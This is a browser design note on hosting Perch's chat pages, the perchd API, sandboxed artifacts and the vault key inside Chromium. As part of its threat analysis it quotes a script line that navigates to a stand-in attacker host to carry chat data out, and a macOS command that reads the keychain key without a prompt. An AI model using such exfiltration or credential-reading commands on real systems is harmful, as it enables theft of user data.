# How the Perch build hosts the chat pages

Design note for the Chromium plan (roadmap 3b). It covers how the pages in `ui/` and the app API in `perchd/src/app/` run inside Perch. Nothing here is built yet; the pages and the API are, and are tested against Chrome for Testing.

## What exists

- `ui/dist/` (from `cd ui && bun run build`): `sidebar.html`, `chat.html` and hashed assets with relative paths, about 20 KB gzipped in all. Each page's shell loads its styles at once and its page code lazily.
- `perchd/src/app/`: an HTTP + WebSocket API on a loopback port or a Unix socket, a per-launch token, Origin and Host checks, encrypted chats and artifacts, and a separate artifact origin with a strict CSP. Protocol types: `perchd/src/app/protocol.ts`.
- The pages read their config from `window.perchApp = { api, token, windowId, tabId?, theme, accent }`, and in development from the URL fragment. They never put the token in a URL the browser shows or logs.

## WebUI pages

| Page | URL | Alias | Hosts |
|---|---|---|---|
| Full-page chat | `chrome://perch-chat/` | `perch://chat` | `chat.html`, `?chat=<id>` opens a chat |
| Side chat | `chrome://perch-side-chat/` | none (panel only) | `sidebar.html` |

- Package `ui/dist` with a generated `.grd` (a small script lists every file in `ui/dist`), and register each page with a `WebUIConfig` and a `WebUIDataSource` that serves those resources. Build `ui/` before the Chromium build; the Chromium build never runs Vite.
- Content Security Policy for both pages, set on the data source:
  - `script-src 'self'`; no inline scripts (the shells already use none).
  - `connect-src http://127.0.0.1:<port> ws://127.0.0.1:<port>` for the app API.
  - `frame-src perch-artifact:` and `img-src 'self' data: perch-artifact:`.
  - `style-src 'self' 'unsafe-inline'`: Preact sets a few `style` attributes, such as the artifact pane width.
  - `trusted-types` default policy is fine: the pages never assign HTML strings (Markdown renders to elements).
- Config: a request filter on each data source answers `/config.js` with `window.perchApp = {...}` for that WebContents (api origin, token, window id, theme, accent). Add `<script src="config.js">` before the shell script in both HTML files at packaging time. The token never appears in a URL, so it never lands in history, logs or crash keys.
- Fonts: ship Geist, Geist Mono and Geist Serif (SIL OFL) as WOFF2 in the same resources and add `@font-face` rules there. The pages fall back to the system font until then. Perch's pages never load fonts from the network.

## Reaching perchd

`perchd` is started by the browser (spec 7.1) and already supports both listeners:

- **Loopback port (v1).** The browser starts `perchd` with `allowedOrigins = ["chrome://perch-chat", "chrome://perch-side-chat"]`. `perchd` writes `{ "app": { "port", "token" } }` as one line on its private pipe to the browser; the browser keeps both in memory only. Requests need the token (Bearer on HTTP, `token.<token>` subprotocol on the WebSocket); browser pages from any other origin get 403; the Host check stops DNS rebinding. Other macOS users can reach a loopback port but cannot guess a 256-bit token.
- **Unix socket (later, if wanted).** WebUI pages cannot open Unix sockets, so this needs a mojo interface in the browser that forwards calls and events to `perchd`'s socket (0600). It removes the loopback port entirely, at the cost of a C++ proxy. Do this only if a security review asks for it.

## The side panel, one chat per tab

Spec 5.3: a side chat belongs to its tab; switching tabs hides it; switching back shows it with its scroll position and unsent draft; tasks keep running in background tabs; moving a tab to another window takes its side chat.

Recommended design: **one side panel WebContents per window**, not one per tab.

- Register a single window-scoped `SidePanelEntry` ("Perch"). Its WebContents is created the first time the panel opens in that window, so a window that never opens the sidebar costs nothing (spec 5.4).
- A `PerchSidePanelController` per browser window, a `TabStripModelObserver`:
  - On active tab change, it calls `POST /api/windows/<windowId>/active` with `{ tab: { id, title, url } }`. `perchd` publishes `window.active` to every page; the sidebar page saves the old chat's draft and scroll position (or, for a tab with no side chat yet, keeps the unsent draft in memory for that tab) and shows the new tab's side chat or the empty state. Tested end to end in `perchd/test/app-server.test.ts` (the event arrives over the WebSocket) and in `ui/test/pages.test.tsx` against a fake client.
  - On navigation or a title change in any tab: `PATCH /api/tabs/<id>` with `{ windowId, title, url }`. If that tab is active in its window, `perchd` publishes `window.active` again with the new title and URL and the sidebar refreshes the tab it sends as context without reloading the chat.
  - At startup, and after `perchd` restarts: `PUT /api/tabs` with `{ tabs: [{ id, windowId, title, url }, ...] }`, every open tab in every window. This is the list the "All tabs" scope uses, and `perchd` moves every side chat bound to a tab that is not in the list to history.
  - It also decides whether the panel is open for that tab: open if the tab has a side chat the user has not closed, closed otherwise. It keeps one "panel open" bit per tab (`TabInterface` user data), so a tab without a side chat shows no panel, as the spec asks.
  - When a tab is inserted into another window's strip, the next activation in that window moves the binding (`Windows.activate` in `perchd/src/app/app.ts` does this), or call `POST /api/tabs/<id>/move` at once.
  - When a tab closes: `DELETE /api/tabs/<id>`. The chat stays in history. If the tab was active, `window.active` with no tab follows.
- Tab and window ids. Bindings are saved on disk, so a tab id must never be reused for a different tab, across launches too. `SessionID` does not qualify: it is a per-process counter, restored tabs get new values, and after a restart a new tab could get the number of an old one and inherit its chat. Use a random GUID per tab, created when the tab is created and saved with the tab in session restore data (the session service keeps per-tab extra data; confirm the exact API in the Chromium plan), so a restored tab keeps its side chat. If that cannot be done in v1, prefix `SessionID` with a random per-launch epoch (`<epoch>.<id>`); side chats then go to history on restart instead of following restored tabs. In both cases the startup `PUT /api/tabs` frees bindings to tabs that no longer exist. Window ids may stay `SessionID`s with the same epoch prefix; nothing is saved against them except inside a tab binding, which `activate` corrects.
- Why not tab-scoped entries with their own WebContents: each would be a renderer of 20 to 40 MB for every tab with a side chat. The per-window page restores draft and scroll from `perchd`, which survives renderer crashes and restarts too.

## The perch dot and approvals in native chrome

- The browser subscribes to app events through `perchd`'s pipe (the same events the pages get). A chat summary's `status` is `running` or `waiting`.
- Tab strip: a tab whose side chat is `running`, or that is an agent tab of a running chat, draws the 6px breathing dot (DESIGN.md). Tab ownership comes from the custom CDP domain in plan 3b.
- Profile button: one still dot while any chat is `waiting`. The approval itself is answered only in Perch's pages (sidebar or full-page chat), which show the card with the exact text.
- Reduce Motion stops the breathing.

## Artifacts: `perch-artifact://`

- Today artifacts load from a second loopback port (`perchd/src/app/artifact-server.ts`), a different origin from the pages and the API, with `sandbox allow-scripts` in the CSP and on the frame (no popups) (an opaque origin: no cookies, storage or access to other pages), `connect-src 'none'`, scripts, styles, fonts and images only from three CDNs, `frame-ancestors` limited to Perch's pages, and a per-launch HMAC capability in every address.
- In Perch: register `perch-artifact` as a standard, secure, no-access scheme and serve it with a `URLLoaderFactory` that proxies `perch-artifact://<id>/<version>` to the artifact server (or reads the store over the pipe) and copies the CSP and `nosniff` headers. Pages keep using `ArtifactMeta.url`; add an option to `startArtifactServer` so `urlFor` returns `perch-artifact://` addresses when the browser runs `perchd`.
- "Open as a tab" opens the artifact URL in a normal tab; the sandbox CSP keeps it isolated there too. In the sidebar, artifacts always open in a new tab (spec 7.7).
- Navigation must be blocked by the browser. CSP has no working control for a frame navigating itself, so artifact script can still run `location = "https://attacker/?d=..."` or use a meta refresh and carry chat data out in the URL. Add a `NavigationThrottle` for frames (and tabs) whose current URL is `perch-artifact://` that cancels any navigation to another scheme, including renderer-initiated top-level ones, and a test with a page that tries both. Spec 7.7's "no network except CDNs" holds only once this is in.
- "Save to disk" never links to the artifact origin (the `download` attribute is ignored across origins and the page would navigate). The page fetches `GET /api/artifacts/<id>/file?version=<n>` with its token and saves the bytes through a `blob:` URL.

## Data key

- The vault's AES-256-GCM key lives in the Keychain. The development adapter (`perchd/src/app/keychain.ts`) uses `/usr/bin/security`, and an item it creates trusts `/usr/bin/security`, so any process running as the user can read it with `security find-generic-password -w` and no prompt. Today encryption at rest only protects copies of the files taken off the Mac.
- In Perch: the signed browser binary creates and reads the item through Security.framework, with an ACL (or a keychain access group under the app's team id) that trusts only Perch, and passes the key to `perchd` on its private pipe at startup. `perchd` then takes the key from the pipe instead of the `security` adapter (the vault already takes a key source). Secure Enclave wrapping can follow later.

## Themes

- The pages take `theme` and `accent` from the config and switch live when the browser dispatches `new CustomEvent("perch:theme", { detail: { theme, accent } })` on `window`. `"system"` follows macOS appearance and Increase Contrast.
- `ui/scripts/gen-tokens.ts` reads DESIGN.md's tables. Plan 2 can add a second output from the same parser, a C++ color mixer for the native chrome, so the browser and its pages always share one source.

## Host features the pages leave to the browser

| Page control | Today | In Perch |
|---|---|---|
| Close sidebar | calls `window.perchHost.close()` if present | the panel controller closes the panel for that tab |
| Open artifact in a tab | `window.perchHost.openTab(url)`, else `window.open` | opens a foreground tab |
| Attach files, dictate | disabled with a reason | file chooser and macOS on-device speech through a mojo interface |
| `@` context | not built | tab list from the panel controller; memory and skills from their tracks |
| Acting in the user's own tab ("Current tab" scope) | the agent opens the tab's URL in an agent tab | tab ownership CDP domain (plan 3b) hands the real tab to the loop |
